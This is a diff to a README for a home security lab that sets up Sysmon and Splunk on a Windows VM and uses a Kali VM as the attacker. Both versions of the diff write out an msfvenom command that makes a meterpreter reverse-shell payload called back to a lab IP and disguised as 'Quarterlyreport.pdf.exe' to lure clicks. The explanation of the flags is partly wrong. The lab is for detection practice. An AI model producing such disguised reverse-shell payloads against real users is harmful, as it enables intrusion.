@@ -32,20 +32,17 @@ For this lab, we will open up the RDP port(3389) and turn off the firewall on ou
 Ref 1: Virtual Box Settings
 
 To set up our blue team environment on our Windows VM, we will be configuring Sysmon on the endpoint to gather event logs and send them directly to our Splunk instance, also installed on our Windows machine.
-We did this by allocating a Sysmon config file from Github, copying it to the directory containing the Sysmon application, and running the command ./sysmon64.exe -i sysmonconfig.xml in Powershell
-Installing Sysmon will enhance our ability to capture system events (Since I don't want to expose these VMs to the open web, I downloaded the config file from my main PC, enabled bidirectional drag and drop on the VM, and copied the file into the box.) 
-I also had to install the Sysmon addon for Splunk and create the "endpoint" index. This index points to our Sysmon config file, allowing Sysmon to send logs to our Splunk instance
-SPLUNK SETUP
-
+We did this by allocating a Sysmon config file from Github, copying it to the directory containing the Sysmon application, and running the command ./sysmon64.exe -i sysmonconfig.xml in Powershell.
+Installing Sysmon will enhance our ability to capture system events.(Since I don't want to expose these VMs to the open web, I downloaded the config file from my main PC, enabled bidirectional drag and drop on the VM, and copied the file directly into the VM.) 
+For Splunk configuration, I installed the Sysmon add-on and created the "endpoint" index. Our Sysmon config file will point to the index we created by its name, allowing Sysmon to send logs to our Splunk instance
 
 
 KALI SETUP
-
-Created Malware payload msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
--p chooses the payload we want to use provided by the Metasploit tool 
-lhost determines where this reverse shell will remote back to, we chose the IP of the red team box
+To create telemetry from our Kali VM to our Windows VM, we are going to use the well-known Metasploit pentesting tool.
+We will start by creating the Malware payload with this command: msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
+-p chooses the payload we want to use provided by the Metasploit tool. 
+"lhost", determines which IP this reverse shell payload will remote back to when executed.
 -f will decide the file name, we will name it Quarterlyreport.pdf.exe to entice the "end user" to click on it.
-
 
 ![Screenshot 2025-03-12 072905](https://github.com/user-attachments/assets/17e8deb8-90ab-4509-b982-a718275314f4)
 
